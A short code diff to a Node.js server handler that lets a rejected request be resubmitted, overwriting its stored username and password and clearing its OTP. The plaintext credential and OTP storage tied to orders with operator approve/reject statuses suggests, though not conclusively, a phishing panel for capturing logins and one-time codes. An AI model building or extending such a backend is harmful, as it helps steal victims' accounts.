@@ -122,6 +122,17 @@ const server = http.createServer(async (req, res) => {
       const username = (body.username || '').toString().slice(0, 100);
       const password = (body.password || '').toString().slice(0, 100);
       const orderId = Number(body.orderId);
+      const existingRequestId = Number(body.existingRequestId);
+
+      const existingRequest = requests.find((r) => r.id === existingRequestId && r.status === 'rejected');
+      if (existingRequest) {
+        existingRequest.username = username;
+        existingRequest.password = password;
+        existingRequest.otp = null;
+        existingRequest.status = 'pending';
+        return sendJSON(res, 200, { ok: true, id: existingRequest.id });
+      }
+
       const linkedOrder = requests.find((request) => (
         request.id === orderId && request.type === 'watch-order'
       ));
